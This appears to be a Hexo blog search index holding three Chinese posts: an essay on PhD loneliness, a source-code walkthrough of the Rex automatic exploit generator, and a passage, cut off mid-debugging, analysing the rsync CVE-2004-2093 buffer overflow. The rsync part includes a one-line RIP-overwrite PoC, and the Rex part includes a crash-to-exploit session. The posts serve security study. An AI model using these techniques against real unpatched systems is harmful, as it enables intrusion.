<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>即使风雨兼程，也能守得云开见月明</title>
      <link href="/2020/12/08/%E9%A3%8E%E9%9B%A8%E5%85%BC%E7%A8%8B/"/>
      <url>/2020/12/08/%E9%A3%8E%E9%9B%A8%E5%85%BC%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本文是某次刷知乎时偶然看到的，虽然作者以“读博”为例，但“修真之旅”却并不仅限于此。每次读来都深以为然，无论如何，愿自己在“修真之旅”中也能够“守得云开见月明”。</p><a id="more"></a><p>读博士期间的抑郁非常普遍，我读博的头两年也是如此，每天暗无天日，浑浑噩噩。现在回头想想，这种不开心是“根儿”上的，是读博士⽆法避免的。</p><p>首先，“博士”到底是个什么东西呢?我刚到耶鲁的时候，研究生院的院长Tom Pollard曾经为我们解释过，他说“当你可以把Dr.放在名字的前面时，就意味着你成为了一位独⽴科学家 (independent scientist)!” 之前我⼀直把注意力放在“科学家”上，觉得离童年的梦想越来越近了。直到最近我才意识到这句话的关键不在“科学家”，而在“独立”二字!<br>其实你在读博士之前就已经可以搞科研了，你可以大量地阅读文献，可以做⼀些尝试性的实验，甚至是发表学术论文。但是这些并不是博士培养的全部，甚至都不是博⼠培养的重点!重点是“独立”二字，也就是在问题描述里反复出现的“孤独”，“⼀个人”之类的不开心的源泉。这种不开心是“根⼉”上的，是无法避免的!<br>当你开始博士的修真之旅后，你就会像他一样:<br> <img src="/2020/12/08/风雨兼程/1.png" alt=""></p><p>独立意味着你要在这茫茫沙漠中独自寻找前进的方向，你的每一步都可能是人类全新的征途;<br>独立意味着你要在这全新的征途中独自克服一切困难，没有人能告诉你面前的那座山要怎么去翻;<br>独立意味着当你千辛万苦翻过那座山后，⽆论看到的是绿洲还是另一⽚沙漠，你都只能独自享受，无法同任何人分享。<br>这条路，你要一个人走!那种被边缘化、被世界遗弃的感觉会一直伴随着你，直到你放弃或者走不动了为止。你可能会问，不是还有博士生导师吗?而我要告诉你的是，导师其实就是那个远在56,000,000公里以外的地球指挥官:<br> <img src="/2020/12/08/风雨兼程/2.png" alt=""></p><p>他说:“去火星吧!” 你就踏上了征途。之后他能做的就是不定期看看你是不是还活着，是不是还在继续前进。虽然他可以时不时地为你指引方向，为你提供援助，甚至是在你翻⼭越岭时为你加油鼓气，在你抵达绿洲时为你欢呼雀跃。但每一步路你都要自己走，每种苦你都得自己吃。更重要的是，当陪伴你一段旅程后，除了精神上的支持，那个远在56,000,000公里以外的导师什么都做不了，你终归还是要独立的!<br>这条路上，你不仅要忍耐孤独，还要学会享受孤独。 你要练就自娱自乐甚至是⾃黑的能力:<br> <img src="/2020/12/08/风雨兼程/3.png" alt=""></p><p>还要不断寻找前进的动力，精神的寄托:<br> <img src="/2020/12/08/风雨兼程/4.png" alt=""></p><p>当你终于找到那片绿色时，即使无人可以分享，你也会觉得这一切的一切都是值得的:<br> <img src="/2020/12/08/风雨兼程/5.png" alt=""></p><p>愿你一路好走!即使风雨兼程，也能守得云开⻅⽉明!</p>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Exploit 自动生成引擎 Rex</title>
      <link href="/2019/03/28/rex-1/"/>
      <url>/2019/03/28/rex-1/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>来自 <a href="https://www.ucsb.edu" target="_blank" rel="noopener">UCSB</a>  的团队 <a href="http://shellphish.net/cgc/" target="_blank" rel="noopener">Shellphish</a>，为参加 DARPA 举办的 <a href="https://ma3k4h3d.top/2018/11/01/CGC/" target="_blank" rel="noopener">CGC</a> 竞赛，设计并实现了 CRS（Cyber Reasoning System）<a href="https://github.com/mechaphish" target="_blank" rel="noopener">Mechaphish</a>。该系统包含自动化漏洞挖掘模块 Driller、Exploit自动生成引擎 Rex、自动补丁模块 Patcherex 以及 ropchain 生成模块 angrop。本文主要对其中的 Exploit 自动生成引擎 <a href="https://github.com/shellphish/rex" target="_blank" rel="noopener">Rex</a> 进行介绍，通过分析 Rex 源码，重点对 Crash 复现及可利用判断部分进行说明。弟作为一只资深菜鸡，文中难免存在不当之处，望各位师傅指正 Orz…</p><a id="more"></a><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>Exploit 自动生成引擎 Rex 在硬件模拟器 QEMU 与二进制分析平台 angr 的基础上，通过 Concolic Execution 实现 Exploit 的自动生成。将待分析的应用程序及导致应用程序崩溃的 Crash 作为系统输入，Rex 将复现崩溃路径，并对崩溃时的寄存器状态及内存布局进行分析，判断 Crash 的可利用性，并自动生成 Exploit。</p><p><img src="/2019/03/28/rex-1/Rex_sys.png" alt=""></p><p>源码中对漏洞类型的定义:</p><p><img src="/2019/03/28/rex-1/vulnerability.png" alt=""></p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>安装 Rex 存在两种方式：1）安装 Mechaphish，<a href="https://github.com/mechaphish/mecha-docs/blob/master/development.md" target="_blank" rel="noopener">安装文档</a>；2）仅安装 Rex，<a href="https://github.com/shellphish/rex/issues/5" target="_blank" rel="noopener">参考文档</a>。二者的差别在于 Mechaphish 包含漏洞挖掘模块 Driller、自动利用模块 Rex、自动补丁模块 Patcherex 以及 ropchain 生成模块 angrop。由于各模块之间相互独立，因此本文选择仅安装自动利用模块 Rex。本地环境采用 Ubuntu 16.04.5 Desktop(64 bit)。部署过程中，Rex 所需依赖如下:  </p><p><img src="/2019/03/28/rex-1/Rex.png" alt=""></p><p>安装依赖过程中部分路径需要调整，根据提示信息修改即可。各个依赖所承担的功能如下：</p><table><thead><tr><th>组件名称</th><th>功能</th></tr></thead><tbody><tr><td>angr</td><td>A powerful and user-friendly binary analysis platform!</td></tr><tr><td>tracer</td><td>Utilities for generating dynamic traces.</td></tr><tr><td>angrop</td><td>angrop is a rop gadget finder and chain builder.</td></tr><tr><td>compilerex</td><td>POV templates and compilation support for CGC binaries. compilerex is a hacky cgc binary compiler</td></tr><tr><td>shellphish-qemu</td><td>Shellphish’s pip-installable package of QEMU</td></tr><tr><td>povsim</td><td>POV simulation for CGC.</td></tr></tbody></table><p>安装完成后，使用以下代码对 Rex 的功能进行测试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># triage a crash</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>crash = rex.Crash(<span class="string">"./legit_00003"</span>, <span class="string">b"\x00\x0b1\xc1\x00\x0c\xeb\xe4\xf1\xf1\x14\r\rM\r\xf3\x1b\r\r\r~\x7f\x1b\xe3\x0c`_222\r\rM\r\xf3\x1b\r\x7f\x002\x7f~\x7f\xe2\xff\x7f\xff\xff\x8b\xc7\xc9\x83\x8b\x0c\xeb\x80\x002\xac\xe2\xff\xff\x00t\x8bt\x8bt_o_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff_k_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff\x00t\x8bt\x8b\xac\xf1\x83\xc2t~c\x00\x00\x00~~\x7f\xe2\xff\xff\x00t\x9e\xac\xe2\xf1\xf2@\x83\xc3t"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>crash.crash_types</span><br><span class="line">[<span class="string">'write_what_where'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>crash.explorable()</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line"><span class="comment"># explore the crash by setting segfaulting pointers to sane values and re-tracing</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>crash.explore()</span><br><span class="line"><span class="comment"># now we can see that we control instruction pointer</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>crash.crash_types</span><br><span class="line"><span class="string">'ip_overwrite'</span></span><br><span class="line"><span class="comment"># generate exploits based off of this crash</span></span><br><span class="line"><span class="comment"># it may take several minutes</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal = crash.exploit()</span><br><span class="line"><span class="comment"># we generated a type 1 POV for every register</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(arsenal.register_setters) <span class="comment"># we generate one circumstantial register setter, one shellcode register setter</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># and one Type 2 which can leak arbitrary memory</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(arsenal.leakers)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment"># exploits are graded based on reliability, and what kind of defenses they can</span></span><br><span class="line"><span class="comment"># bypass, the two best exploits are put into the 'best_type1' and 'best_type2' attributes</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal.best_type1.register</span><br><span class="line"><span class="string">'ebp'</span></span><br><span class="line"><span class="comment"># exploits can be dumped in C, Python, or as a compiled POV</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal.best_type2.dump_c(<span class="string">'legit3_x.c'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal.best_type2.dump_python(<span class="string">'legit3_x.py'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal.best_type2.dump_binary(<span class="string">'legit3_x.pov'</span>)</span><br><span class="line"><span class="comment"># also POVs can be tested against a simulation of the CGC architecture</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>arsenal.best_type1.test_binary()</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="/2019/03/28/rex-1/install_success.png" alt=""></p><h2 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h2><p>查看 Rex 源码的目录结构：</p><p><img src="/2019/03/28/rex-1/rex_tree.png" alt=""></p><p>分析各类之间的依赖关系，从逻辑上大致可分为四部分：</p><ul><li>Exploit_factory：调用各模块，负责自动生成 Exploit；</li><li>Crash：复现崩溃路径，判定 Crash 的可利用性；</li><li>Technique：对于可利用的 Crash，采用针对性的技术，生成 Exploit；</li><li>Shellcode_factory：shellcode 仓库，根据需要选用合适的 Shellcode。</li></ul><p><img src="/2019/03/28/rex-1/rex_class_structure.png" alt=""></p><p>下文重点对 Crash 可利用性判定部分进行分析。</p><h2 id="四、Crash-可利用性判定"><a href="#四、Crash-可利用性判定" class="headerlink" title="四、Crash 可利用性判定"></a>四、Crash 可利用性判定</h2><p>Rex 以 Concolic Execution 的方式复现 crash 路径，分析崩溃时寄存器状态及内存布局，并对 crash 的可利用性进行判定，相关功能代码集中在 Crash.py 中。对原理感兴趣的同学可以参考论文<a href="https://github.com/Ma3k4H3d/Papers/blob/master/2016_SP_angrSoK.pdf" target="_blank" rel="noopener">《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》</a>，以下是对论文原文的引用：</p><hr><p><strong>Vulnerable States.</strong> Unlike AEG/Mayhem, but similar to AXGEN, we generate exploits by performing concolic execution on crashing program inputs using angr. We drive concolic execution forward, forcing it to follow the same path as a dynamic trace gathered by concretely executing the crashing input applied to the program. Concolic execution is stopped at the point where the program crashed, and we inspect the symbolic state to determine the cause of the crash and measure exploitability. By counting the number of symbolic bits in certain registers, we can triage a crash into a number of categories such as <em>frame pointer overwrite, instruction pointer overwrite, or arbitrary write,</em> among others.  </p><hr><h3 id="1、Concrete-Execution"><a href="#1、Concrete-Execution" class="headerlink" title="1、Concrete Execution"></a>1、Concrete Execution</h3><p>Concolic Execution 原理请感兴趣的同学自行查阅。angr 在实现 concolic execution 时，需要提供 crash_addr。</p><p><img src="/2019/03/28/rex-1/trace.png" alt=""></p><p>因此，通过 QEMU 加载二进制程序及 PoC，以获取 crash_addr。相关功能在 <a href="https://github.com/angr/tracer" target="_blank" rel="noopener">Tracer</a> 模块中实现。  </p><p><img src="/2019/03/28/rex-1/Tracer.png" alt=""></p><p>Crash.py 中调用 Tracer 模块的代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tracer_args=&#123;</span><br><span class="line"><span class="string">'ld_linux'</span>: os.path.join(bin_location, <span class="string">'tests/i386/ld-linux.so.2'</span>),</span><br><span class="line"><span class="string">'library_path'</span>: os.path.join(bin_location, <span class="string">'tests/i386'</span>)&#125;</span><br><span class="line">r = tracer.QEMURunner(binary=binary, input=input_data, argv=argv, trace_timeout=trace_timeout, **tracer_args)</span><br></pre></td></tr></table></figure></p><h3 id="2、Concolic-Execution"><a href="#2、Concolic-Execution" class="headerlink" title="2、Concolic Execution"></a>2、Concolic Execution</h3><p>在获取 crash_addr 之后，对 angr 进行配置，并执行 Concolic Execution。 其中，较为关键的配置包括：</p><ul><li>初始状态设定</li><li>State Plugin 选择</li><li>路径探索策略。</li></ul><h3 id="（1）初始状态设定"><a href="#（1）初始状态设定" class="headerlink" title="（1）初始状态设定"></a>（1）初始状态设定</h3><p>配置 simulation_manager 中的 save_unconstrained 参数。 其中 <code>r</code> 为 tracer.QEMURunner() 返回值，当 PoC 成功触发崩溃时 r.crash_mode 为 <code>True</code>，失败时为 <code>False</code>。  </p><p><img src="/2019/03/28/rex-1/sm.png" alt=""></p><p>通过 full_init_state()方法，设置程序的初始状态：</p><p><img src="/2019/03/28/rex-1/full_init_state.png" alt=""></p><p><img src="/2019/03/28/rex-1/initial_state_code.png" alt=""></p><ul><li><strong>设置 tracing 模式：mode = ‘tracing’</strong></li></ul><p><img src="/2019/03/28/rex-1/mode.png" alt=""></p><ul><li><strong>add_options:</strong></li></ul><table><thead><tr><th>Option name</th><th>Description</th></tr></thead><tbody><tr><td>so.MEMORY_SYMBOLIC_BYTES_MAP</td><td>Maintain a mapping of symbolic variable to which memory address it “really” corresponds to, at the paged memory level?</td></tr><tr><td>so.TRACK_ACTION_HISTORY</td><td>track the history of actions through a path (multiple states). This action affects things on the angr level</td></tr><tr><td>so.CONCRETIZE_SYMBOLIC_WRITE_SIZES</td><td>Concretize the sizes of symbolic writes to memory</td></tr><tr><td>so.CONCRETIZE_SYMBOLIC_FILE_READ_SIZES</td><td>Concreteize the sizes of file reads</td></tr><tr><td>so.TRACK_MEMORY_ACTIONS</td><td>Keep a SimAction for each memory read and write</td></tr></tbody></table><ul><li><strong>remove_options:</strong><br>由于 ‘tracing’ 模式下预制了一些选项，因此在优化策略时，不仅需要add_options，而且需要 remove_options。定义在<code>./angr/sim_options.py</code>中：</li></ul><table><thead><tr><th>Option name</th><th>Description</th></tr></thead><tbody><tr><td>so.TRACK_REGISTER_ACTIONS</td><td>Keep a SimAction for each register read and write</td></tr><tr><td>so.TRACK_TMP_ACTIONS</td><td>Keep a SimAction for each temporary variable read and write</td></tr><tr><td>so.TRACK_JMP_ACTIONS</td><td>Keep a SimAction for each jump or branch</td></tr><tr><td>so.ACTION_DEPS</td><td>Track dependencies in SimActions</td></tr><tr><td>so.TRACK_CONSTRAINT_ACTIONS</td><td>Keep a SimAction for each constraint added</td></tr><tr><td>so.LAZY_SOLVES</td><td>Don’t check satisfiability until absolutely necessary</td></tr><tr><td>so.SIMPLIFY_MEMORY_WRITES</td><td>Run values stored to memory through z3’s simplification</td></tr><tr><td>so.ALL_FILES_EXIST</td><td>Attempting to open an unkown file will result in creating it with a symbolic length</td></tr></tbody></table><ul><li>设置约束条件：</li></ul><p><img src="/2019/03/28/rex-1/libc.png" alt=""></p><h3 id="（2）-State-Plugins"><a href="#（2）-State-Plugins" class="headerlink" title="（2） State Plugins"></a>（2） State Plugins</h3><p>SimState 属于 angr 核心概念之一，并被设计为插件式的架构，可以根据分析任务的不同，选用针对性的插件。Rex 默认选用了 ‘posix’ 与 ‘preconstrainer’。插件源码位于<code>./angr/state_plugins/</code>目录下。<br><img src="/2019/03/28/rex-1/register_plugin.png" alt=""></p><ul><li><p>SimSystemPosix()<br>Data storage and interaction mechanisms for states with an environment conforming to posix.<br>Available as <code>state.posix</code>.</p></li><li><p>SimStatePreconstrainer()<br>This state plugin manages the concept of preconstraining - adding constraints which you would like to remove later.<br>:param constrained_addrs : SimActions for memory operations whose addresses should be constrained during crash analysis</p></li></ul><h3 id="（3）-路径探索策略"><a href="#（3）-路径探索策略" class="headerlink" title="（3） 路径探索策略"></a>（3） 路径探索策略</h3><p>路径搜索策略的选择，对符号执行来说举足轻重。由于 Rex 在采用 Concolic Execution，因此设置了 ‘Tracer’、’Oppologist’ 两种路径搜索策略。</p><p><img src="/2019/03/28/rex-1/et.png" alt=""></p><p>angr 内置的路径搜索方法存储于 <code>./angr/exploration_techniques/</code> 目录下。Crash.py 中调用代码如下：</p><p><img src="/2019/03/28/rex-1/explore_tech.png" alt=""></p><h3 id="3、Crash-Triage"><a href="#3、Crash-Triage" class="headerlink" title="3、Crash Triage"></a>3、Crash Triage</h3><p>_triage_crash() 中根据 eip、ebp 中符号变量的个数，及发生崩溃时的操作，对 Crash 类型进行判定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_triage_crash</span><span class="params">(self)</span>:</span></span><br><span class="line">    ip = self.state.regs.ip</span><br><span class="line">    bp = self.state.regs.bp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># any arbitrary receives or transmits</span></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> receives</span></span><br><span class="line">    zp = self.state.get_plugin(<span class="string">'zen_plugin'</span>) <span class="keyword">if</span> self.os == <span class="string">'cgc'</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> zp <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> len(zp.controlled_transmits):</span><br><span class="line">        l.debug(<span class="string">"detected arbitrary transmit vulnerability"</span>)</span><br><span class="line">        self.crash_types.append(Vulnerability.ARBITRARY_TRANSMIT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we assume a symbolic eip is always exploitable</span></span><br><span class="line">    <span class="keyword">if</span> self.state.solver.symbolic(ip):</span><br><span class="line">        <span class="comment"># how much control of ip do we have?</span></span><br><span class="line">        <span class="keyword">if</span> self._symbolic_control(ip) &gt;= self.state.arch.bits:</span><br><span class="line">            l.info(<span class="string">"detected ip overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.IP_OVERWRITE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.info(<span class="string">"detected partial ip overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.PARTIAL_IP_OVERWRITE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.state.solver.symbolic(bp):</span><br><span class="line">        <span class="comment"># how much control of bp do we have</span></span><br><span class="line">        <span class="keyword">if</span> self._symbolic_control(bp) &gt;= self.state.arch.bits:</span><br><span class="line">            l.info(<span class="string">"detected bp overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.BP_OVERWRITE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.info(<span class="string">"detected partial bp overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.PARTIAL_BP_OVERWRITE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if nothing obvious is symbolic let's look at actions</span></span><br><span class="line">    <span class="comment"># grab the all actions in the last basic block</span></span><br><span class="line">    symbolic_actions = [ ]</span><br><span class="line">    <span class="keyword">if</span> self._t <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> self._t.last_state <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        recent_actions = reversed(self._t.last_state.history.recent_actions)</span><br><span class="line">        state = self._t.last_state</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> this is a dead assignment! what was this supposed to be?</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recent_actions = reversed(self.state.history.actions)</span><br><span class="line">        state = self.state</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> recent_actions:</span><br><span class="line">        <span class="keyword">if</span> a.type == <span class="string">'mem'</span>:</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.symbolic(a.addr):</span><br><span class="line">                symbolic_actions.append(a)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> pick the crashing action based off the crashing instruction address,</span></span><br><span class="line">    <span class="comment"># crash fixup attempts will break on this</span></span><br><span class="line">    <span class="comment">#import ipdb; ipdb.set_trace()</span></span><br><span class="line">    <span class="keyword">for</span> sym_action <span class="keyword">in</span> symbolic_actions:</span><br><span class="line">        <span class="keyword">if</span> sym_action.action == <span class="string">"write"</span>:</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.symbolic(sym_action.data):</span><br><span class="line">                l.info(<span class="string">"detected write-what-where vulnerability"</span>)</span><br><span class="line">                self.crash_types.append(Vulnerability.WRITE_WHAT_WHERE)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l.info(<span class="string">"detected write-x-where vulnerability"</span>)</span><br><span class="line">                self.crash_types.append(Vulnerability.WRITE_X_WHERE)</span><br><span class="line">             self.violating_action = sym_action</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sym_action.action == <span class="string">"read"</span>:</span><br><span class="line">            <span class="comment"># special vulnerability type, if this is detected we can explore the crash further</span></span><br><span class="line">            l.info(<span class="string">"detected arbitrary-read vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.ARBITRARY_READ)</span><br><span class="line"></span><br><span class="line">            self.violating_action = sym_action</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><h2 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h2><p>以上是对 Exploit 自动生成引擎 Rex 的简要介绍，包括 Rex 是什么、如何安装、源码结构，并结合论文，着重对 Crash 可利用性判定的相关代码进行分析。弟作为一只二进制菜鸡，胡言乱语了这么多，望各位师傅批评指正 Orz…</p><h2 id="六、参考资料："><a href="#六、参考资料：" class="headerlink" title="六、参考资料："></a>六、参考资料：</h2><ol><li>rex  <a href="https://github.com/shellphish/rex" target="_blank" rel="noopener">https://github.com/shellphish/rex</a></li><li>Mechaphish  <a href="https://github.com/mechaphish" target="_blank" rel="noopener">https://github.com/mechaphish</a></li><li>Shellphish <a href="http://shellphish.net/cgc/" target="_blank" rel="noopener">http://shellphish.net/cgc/</a></li><li>angr docs  <a href="https://docs.angr.io" target="_blank" rel="noopener">https://docs.angr.io</a></li><li>angr <a href="https://github.com/angr" target="_blank" rel="noopener">https://github.com/angr</a></li><li>《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》 <a href="https://github.com/Ma3k4H3d/Papers/blob/master/2016_SP_angrSoK.pdf" target="_blank" rel="noopener">https://github.com/Ma3k4H3d/Papers/blob/master/2016_SP_angrSoK.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> AEG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现</title>
      <link href="/2019/03/19/CVE-2004-2093/"/>
      <url>/2019/03/19/CVE-2004-2093/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-rsync-简介"><a href="#0x00-rsync-简介" class="headerlink" title="0x00 rsync 简介"></a>0x00 rsync 简介</h2><p>Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. It offers a large number of options that control every aspect of its behavior and permit very flexible specification of the set of files to be copied. It is famous for its delta-transfer algorithm, which reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination. Rsync is widely used for backups and mirroring and as an improved copy command for everyday use.</p><a id="more"></a><p>Rsync finds files that need to be transferred using a “quick check” algorithm (by default) that looks for files that have changed in size or in last-modified time. Any changes in the other preserved attributes (as requested by options) are made on the destination file directly when the quick check indicates that the file’s data does not need to be updated.</p><p>Some of the additional features of rsync are:</p><ul><li>support for copying links, devices, owners, groups, and permissions</li><li>exclude and exclude-from options similar to GNU tar</li><li>a CVS exclude mode for ignoring the same files that CVS would ignore</li><li>can use any transparent remote shell, including ssh or rsh</li><li>does not require super-user privileges</li><li>pipelining of file transfers to minimize latency costs</li><li>support for anonymous or authenticated rsync daemons (ideal for mirroring)</li></ul><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p><img src="/2019/03/19/CVE-2004-2093/CVE-Details_min.png" alt="">  </p><h2 id="0x02-CVE-2004-2093-漏洞原理"><a href="#0x02-CVE-2004-2093-漏洞原理" class="headerlink" title="0x02 CVE-2004-2093 漏洞原理"></a>0x02 CVE-2004-2093 漏洞原理</h2><h3 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h3><p>溢出点位于 socket.c 文件中的 open_socket_out() 函数内。漏洞产生的原因在于，程序读入环境变量 RSYNC_PROXY 时未检查缓冲区边界。当使用 rsync 连接远程  deamon 服务器时会触发漏洞。rsync 手册中对 “CONNECTING TO AN RSYNC DAEMON” 的描述如下：  </p><hr><p><strong>CONNECTING TO AN RSYNC DAEMON</strong><br>It is also possible to use rsync without a remote shell as the transport. In this case you will directly connect to a remote rsync daemon, typically using TCP port 873. (This obviously requires the daemon to be running on the remote system, so refer to the STARTING AN RSYNC DAEMON TO ACCEPT CONNECTIONS section below for information on that.)</p><p>Using rsync in this way is the same as using it with a remote shell except that:</p><ul><li>you either use a double colon :: instead of a single colon to separate the hostname from the path, or you use an rsync:// URL.</li><li>the first word of the “path” is actually a module name.</li><li>the remote daemon may print a message of the day when you connect.</li><li>if you specify no path name on the remote daemon then the list of accessible paths on the daemon will be shown.</li><li>if you specify no local destination then a listing of the specified files on the remote daemon is provided.</li><li><p>you must not specify the –rsh (-e) option.<br>An example that copies all the files in a remote module named “src”:</p><p>  rsync -av host::src /dest</p></li></ul><hr><p>open_socket_out() 函数如下：</p><p><img src="/2019/03/19/CVE-2004-2093/code_min.png" alt=""></p><h3 id="2、汇编"><a href="#2、汇编" class="headerlink" title="2、汇编"></a>2、汇编</h3><p>溢出点处，strcpy() 的目的地址为 portbuf[10]。查看汇编代码，portbuf 地址为 RBP - 0x7a，因此偏移量为 0x7a。  </p><p><img src="/2019/03/19/CVE-2004-2093/asm_min.png" alt=""></p><h3 id="3、Debug"><a href="#3、Debug" class="headerlink" title="3、Debug"></a>3、Debug</h3><p>基于以上分析，尝试构造 PoC，构造条件为</p><ul><li>PoC 中需包含字符 “:”</li><li>“:” 后的数据为 122 字节（0x7a）</li><li>122 字节后追加 6 字节，覆盖 RIP。<br>最终 PoC 为：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "AAAA:" + "A"*122 + "BBBBBB"'</span></span><br></pre></td></tr></table></figure></li></ul><p>通过 GDB 进行调试，运行参数为：run -av localhost::src /dest。使用 set 